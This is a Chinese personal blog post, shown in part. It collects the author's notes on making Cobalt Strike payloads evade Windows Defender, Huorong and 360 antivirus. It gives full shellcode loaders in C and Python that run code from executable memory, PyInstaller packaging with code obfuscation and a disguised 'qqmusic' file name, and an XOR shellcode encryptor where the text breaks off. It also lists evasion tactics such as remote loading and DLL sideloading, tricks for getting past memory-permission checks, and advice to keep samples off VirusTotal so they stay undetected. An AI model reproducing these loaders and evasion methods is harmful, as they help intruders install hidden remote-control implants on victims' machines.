<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KaGty1" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      CobaltStrike免杀实践汇总 
      
      
      |
    
     KaGty1 &#39;s Personal Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
    <link rel="icon" href="/images/kagty1.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/kagty1.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">kagty1</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/ctf/">
          <a href="/ctf/">CTF</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">CobaltStrike免杀实践汇总</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2025-06-04 14:00:30
        </span>
        
      </div>
      <div class="markdown-body">
        <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>这两个月内网渗透接触的较多，大多公开的内网渗透靶场(如云镜)环境中都没有设置免杀，CS很轻易就可以连上，但是实战中Windows defender，火绒，360绕不过去，遂于5.18-5.30这12天仔细研究了一下CS免杀，做了一些笔记和总结，希望能形成自己的体系，弥补在免杀知识这一方面的空白。当然，我目前和下文所掌握和提及的免杀技术只不过是皮毛，更深入的免杀还需要深入学习windows底层和逆向工程方面的知识，共勉。</p>
<h3 id="Shellcode与加载器"><a href="#Shellcode与加载器" class="headerlink" title="Shellcode与加载器"></a>Shellcode与加载器</h3><h4 id="Shellcode基础"><a href="#Shellcode基础" class="headerlink" title="Shellcode基础"></a>Shellcode基础</h4><h5 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h5><p>shellcode是一种特殊的二进制代码，这类二进制代码成功利用后会获取目标系统shell的权限</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常将二进制代码 =&gt; <span class="number">16</span>进制代码 <span class="string">\xfc\x48\x83</span></span><br></pre></td></tr></table></figure>

<h5 id="shellcode文件"><a href="#shellcode文件" class="headerlink" title="shellcode文件"></a>shellcode文件</h5><p>shellcode通常以二进制个数存储，它由CPU直接执行</p>
<p>一个成功运行的大体流程：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exe</span>文件 -&gt;</span> 硬盘 -&gt; 把<span class="function"><span class="title">exe</span>内容读取到内存中 -&gt;</span> 将要执行的代码转换成二进制指令 -&gt; <span class="function"><span class="title">cpu</span>运行 -&gt;</span> 程序运行产生的数据都在内存中</span><br></pre></td></tr></table></figure>

<h5 id="shellcode如何运行"><a href="#shellcode如何运行" class="headerlink" title="shellcode如何运行"></a>shellcode如何运行</h5><p>借助shellcode加载器在目标机器中运行</p>
<h5 id="CS的shellcode生成"><a href="#CS的shellcode生成" class="headerlink" title="CS的shellcode生成"></a>CS的shellcode生成</h5><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518093423254.png" alt="image-20250518093423254"></p>
<p>选择想要生成的语言即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518093448743.png" alt="image-20250518093448743"></p>
<h4 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h4><h5 id="什么是shellcode加载器"><a href="#什么是shellcode加载器" class="headerlink" title="什么是shellcode加载器"></a>什么是shellcode加载器</h5><p>帮助shellcode文件&#x2F;16进制字符串shellcode运行的工具</p>
<h5 id="如何编写shellcode加载器"><a href="#如何编写shellcode加载器" class="headerlink" title="如何编写shellcode加载器"></a>如何编写shellcode加载器</h5><p>使用windows api</p>
<p>(1) 申请内存</p>
<p>(2) 把shellcode复制到这块内存中</p>
<p>(3) 想办法让这块内存中的shellcode被cpu执行</p>
<h5 id="VirtualAlloc函数"><a href="#VirtualAlloc函数" class="headerlink" title="VirtualAlloc函数"></a>VirtualAlloc函数</h5><p><strong>申请内存</strong></p>
<p>VirtualAlloc 是 Windows API中用于分配&#x2F;申请、保留&#x2F;提交内存区域的函数</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc(</span><br><span class="line">    <span class="variable">_In_opt_</span> LPVOID lpAddress,</span><br><span class="line">    <span class="variable">_In_</span>     SIZE_T dwSize,</span><br><span class="line">    <span class="variable">_In_</span>     DWORD flAllocationType,</span><br><span class="line">    <span class="variable">_In_</span>     DWORD flProtect</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>参数含义：</p>
<p>(1) IpAddress: 指定分配&#x2F;保留的内存区域的首选基地址，若参数为NULL，则系统会自动选择适当的地址，所以一般都写NULL即可，也可以写0</p>
<p>(2) dwSize: 指定分配区域的内存的大小，以字节为单位</p>
<p>(3) flAllocationType: 指定内存的分配类型</p>
<p>通常使用 MEM_COMMIT|MEM_RESERVE 的方式进行使用</p>
<p>(4) flProtect: 指定内存的保护属性</p>
<p>直接给满权限 -&gt; 可读可写可执行 -&gt; PAGE_EXECUTE_READWRITE</p>
<h5 id="memcpy函数"><a href="#memcpy函数" class="headerlink" title="memcpy函数"></a>memcpy函数</h5><p><strong>复制shellcode到申请的内存区域中</strong></p>
<p>用于将内存块中的内容从一个位置复制到另一个位置</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void* <span class="variable">__cdecl</span> memcpy(</span><br><span class="line">    <span class="variable">_Out_writes_bytes_all_</span>(<span class="variable">_Size</span>) void* <span class="variable">_Dst</span>,</span><br><span class="line">    <span class="variable">_In_reads_bytes_</span>(<span class="variable">_Size</span>)       void const* <span class="variable">_Src</span>,</span><br><span class="line">    <span class="variable">_In_</span>                          size_t      <span class="variable">_Size</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>(1) void* _Dst: 指向目标内存区域的指针，即复制操作的目标位置</p>
<p>(2) void const* _Src: 指向源内存区域的指针，就是复制的目标</p>
<p>(3) size_t      _Size: 要复制的字节数，直接 sizeof(buf) 即可</p>
<h5 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h5><p>用于创建线程的函数</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CreateThread(</span><br><span class="line">    <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">    <span class="variable">_In_</span> SIZE_T dwStackSize,</span><br><span class="line">    <span class="variable">_In_</span> LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">    <span class="variable">_In_opt_</span> <span class="variable">__drv_aliasesMem</span> LPVOID lpParameter,</span><br><span class="line">    <span class="variable">_In_</span> DWORD dwCreationFlags,</span><br><span class="line">    <span class="variable">_Out_opt_</span> LPDWORD lpThreadId</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>需要关注的参数</p>
<p>IpStartAddress: 写我们申请的内存地址，<strong>注意：需要进行类型转换</strong></p>
<p>剩下的一律写NULL</p>
<h4 id="C语言加载器"><a href="#C语言加载器" class="headerlink" title="C语言加载器"></a>C语言加载器</h4><h5 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、申请内存</span></span><br><span class="line"><span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line"><span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 892 bytes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、申请内存</span></span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,<span class="built_in">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line">	<span class="comment">//创建线程执行</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//等待线程运行</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行生成exe执行后，便可CS上线了。</p>
<h5 id="Visual-Studio配置"><a href="#Visual-Studio配置" class="headerlink" title="Visual Studio配置"></a>Visual Studio配置</h5><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518153653433.png" alt="image-20250518153653433"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518153936668.png" alt="image-20250518153936668"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518154008011.png" alt="image-20250518154008011"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518154851397.png" alt="image-20250518154851397"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518155102697.png" alt="image-20250518155102697"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518155139368.png" alt="image-20250518155139368"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518155200902.png" alt="image-20250518155200902"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518155401655.png" alt="image-20250518155401655"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250518155445162.png" alt="image-20250518155445162"></p>
<h4 id="Python语言加载器"><a href="#Python语言加载器" class="headerlink" title="Python语言加载器"></a>Python语言加载器</h4><p>不同的编程语言的免杀效果是不一样的</p>
<h5 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># ctypes.windll.kernel32中存放windows api</span></span><br><span class="line"><span class="comment"># 获得windows api中的Virtualloc函数</span></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory</span><br><span class="line">CreateThread = ctypes.windll.kernel32.CreateThread</span><br><span class="line">WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.申请内存</span></span><br><span class="line"><span class="comment"># b&quot;&quot;转换成字节类型</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83...&quot;</span></span><br><span class="line"><span class="comment"># 还需要转换成字节数组类型</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"><span class="comment"># 重载函数返回类型为c_uint64</span></span><br><span class="line">VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">addr = VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.将shellcode复制到刚刚申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">RtlMoveMemory(ctypes.c_void_p(addr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.创建线程</span></span><br><span class="line">thread = CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                      ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                      ctypes.c_void_p(addr),</span><br><span class="line">                      ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                      ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                      ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">WaitForSingleObject(ctypes.c_int(thread), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h5 id="python打包exe"><a href="#python打包exe" class="headerlink" title="python打包exe"></a>python打包exe</h5><p>安装环境</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pip3</span> install pyinstaller</span><br><span class="line"><span class="attribute">pip3</span> install pyinstaller==<span class="number">5</span>.<span class="number">8</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>打包命令</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pyinstaller</span> -F -w demo1.py</span><br></pre></td></tr></table></figure>

<p>-F: 打包成一个exe文件</p>
<p>-w: 不显示黑窗口，也可以用–noconsole参数</p>
<p>-i: 指定图标，.ico文件&#x2F;.exe文件</p>
<p>-n: 指定打包好的文件名</p>
<p>–clean 清除上一次打包的文件</p>
<p>–key cjiurfe11a 混淆代码功能 (需要安装 pip3 install tinyaes)</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w demo1<span class="selector-class">.py</span> -<span class="selector-tag">i</span> <span class="string">&quot;D:\Chanzi-SAST\ChanziSAST.exe&quot;</span> -n qqmusic <span class="attr">--clean</span> <span class="attr">--key</span> xxxx</span><br></pre></td></tr></table></figure>



<h3 id="Shellcode免杀"><a href="#Shellcode免杀" class="headerlink" title="Shellcode免杀"></a>Shellcode免杀</h3><h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><h5 id="免杀的方法有哪些"><a href="#免杀的方法有哪些" class="headerlink" title="免杀的方法有哪些"></a>免杀的方法有哪些</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、加壳</span><br><span class="line"><span class="number">2</span>、shellcode混淆，加密</span><br><span class="line"><span class="number">3</span>、各种语言的加载器：C++、<span class="keyword">python</span>、<span class="keyword">go</span>、rust等等</span><br><span class="line"><span class="number">4</span>、分类免杀(远程加载)，shellcode和加载器不写在一个文件中，远程加载等等</span><br><span class="line"><span class="number">5</span>、白加黑(百名但程序执行恶意样本)</span><br><span class="line"><span class="number">6</span>、使用github上的一些免杀工具</span><br><span class="line"><span class="number">7</span>、自己写加载器，通过一些冷门的加载方式运行shellcode</span><br><span class="line"><span class="number">8</span>、自己写/二开远控等等</span><br></pre></td></tr></table></figure>

<h4 id="杀软"><a href="#杀软" class="headerlink" title="杀软"></a>杀软</h4><h5 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、测试样本查杀网站，调用很多杀软的引擎进行查杀</span><br><span class="line">若免杀样本需要在实战中使用，不要向vt上上传，因为可能会标记</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//virustotal.com</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//virscan.org</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、云沙箱</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//s.threatbook.com  微步云沙箱</span></span><br></pre></td></tr></table></figure>

<h5 id="静态查杀"><a href="#静态查杀" class="headerlink" title="静态查杀"></a>静态查杀</h5><p>通常使用病毒特征库，从**”特定代码片段”、”独特的字符串”、”文件结构”**等几个方面，若文件中的这些特征和病毒特征库匹配，则认为其是木马病毒。</p>
<h6 id="代码中的函数"><a href="#代码中的函数" class="headerlink" title="代码中的函数"></a>代码中的函数</h6><p>如windows api函数，和内存、堆、线程相关的函数</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">virtualalloc,</span> rtlmovememory, createthread等等</span><br></pre></td></tr></table></figure>

<p>注：同一个windows api函数，不同的编程语言，可能杀C不杀python</p>
<h6 id="shellcode特征"><a href="#shellcode特征" class="headerlink" title="shellcode特征"></a>shellcode特征</h6><p>CS shellcode特征如 <code>\fc\x48\x83</code></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519101512393.png" alt="image-20250519101512393"></p>
<h6 id="文件名和md5"><a href="#文件名和md5" class="headerlink" title="文件名和md5"></a>文件名和md5</h6><p>所有以<code>tgp_daemon.exe</code>为名的程序一律被判定为银狐木马</p>
<p>每个文件都有一个md5 hash</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CertUtil</span> -hashfile 文件路劲 md5</span><br></pre></td></tr></table></figure>

<p>当样本被查杀时，hash值会被记录下来，下次再扫描时就会直接报毒</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519102201102.png" alt="image-20250519102201102"></p>
<p>当样本免杀了，hash值同样会被记录下来，下次就不会再扫描这个样本了，就实现了永久免杀</p>
<h6 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h6><p>使用加解密行为或者加壳行为可能会被杀软报毒</p>
<h6 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h6><p>白程序都是有数字签名的，某些杀软会看这个exe的数字签名是否合法</p>
<p>以百度网盘为例</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519102912725.png" alt="image-20250519102912725"></p>
<h6 id="资源文件"><a href="#资源文件" class="headerlink" title="资源文件"></a>资源文件</h6><p>杀软会查看exe的资源文件是否为空</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519103155227.png" alt="image-20250519103155227"></p>
<h5 id="动态查杀"><a href="#动态查杀" class="headerlink" title="动态查杀"></a>动态查杀</h5><p>杀软有云沙箱，相当于开一个虚拟机运行你上传的恶意样本，通过分析程序指令出现的顺序&#x2F;特定的组合情况以及所调用的函数及其参数是否属于恶意行为特征，来判断是否是病毒。</p>
<h6 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h6><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查找会连的ip/域名是否之前被标记成cs远控</span><br><span class="line"></span><br><span class="line">通信流量内容</span><br><span class="line">内容特征：数据包中是否存在命令控制相关的关键词/加密特征</span><br><span class="line">结构特征：是否存在已知远控的通讯结构特征，比如某些远控会追加\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="number">0x00</span>\<span class="keyword">x</span><span class="number">00</span>这样的空字节</span><br><span class="line"></span><br><span class="line">有的CS一上线执行命令就被杀，很可能就是流量特征被查杀了。</span><br></pre></td></tr></table></figure>

<h6 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、内存中存在的特征码 - 可以修改</span><br><span class="line"><span class="function"><span class="title">ReflectiveLoader</span><span class="params">(CS中的)</span></span>, beacon.dll等</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、内存相关的属性</span><br><span class="line"><span class="function"><span class="title">rwx</span><span class="params">(shellcode，申请了可读可写可执行的内存)</span></span>，一般为rw</span><br><span class="line">绕过方法：先申请一块可读可写的权限的内存，等程序运行一段实践之后再将其改成可以执行的权限，就可以绕过对内存属性的检查</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、上线后，执行shell whoami后被杀</span><br><span class="line">因为，shell whoami的原理是起一个cmd子进程运行，有的杀软会直接查杀不正常的进程链</span><br></pre></td></tr></table></figure>

<h6 id="360云传"><a href="#360云传" class="headerlink" title="360云传"></a>360云传</h6><p>将样本上传到云沙箱进行运行、分析检测</p>
<h4 id="Shellcode处理"><a href="#Shellcode处理" class="headerlink" title="Shellcode处理"></a>Shellcode处理</h4><h5 id="shellcode加解密"><a href="#shellcode加解密" class="headerlink" title="shellcode加解密"></a>shellcode加解密</h5><p>CS十六进制数值特征：<code>FC4883E4F0E8C800000041</code></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519111129953.png" alt="image-20250519111129953"></p>
<p>杀软一下子就会扫到这种特征，所以需要加密</p>
<h6 id="异或加密"><a href="#异或加密" class="headerlink" title="异或加密"></a>异或加密</h6><p>异或是一种二进制位运算，相同为0，不同为1，不做详细解释了。</p>
<p>python加密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义异或加密函数，接收原始shellcode和密钥作为输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">shellcode, key</span>):</span><br><span class="line">    encrypted_shellcode = <span class="built_in">bytearray</span>()</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历shellcode中的每个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">        <span class="comment"># 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中</span></span><br><span class="line">        <span class="comment"># 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用</span></span><br><span class="line">        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])</span><br><span class="line">    <span class="keyword">return</span> encrypted_shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># CS生成的shellcode</span></span><br><span class="line">    buf = <span class="string">b&quot;\xfc\x48\x83...&quot;</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义密钥</span></span><br><span class="line">    key = <span class="built_in">bytearray</span>(<span class="string">b&#x27;henry&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用xor_encrypt函数加密shellcode</span></span><br><span class="line">    encrypted_shellcode = xor_encrypt(shellcode, key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出加密后的shellcode</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted shellcode:&quot;</span>)</span><br><span class="line">    encrypted_shellcode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_shellcode:</span><br><span class="line">        encrypted_shellcode_string += (<span class="string">&quot;\\x%02x&quot;</span>%byte)</span><br><span class="line">    <span 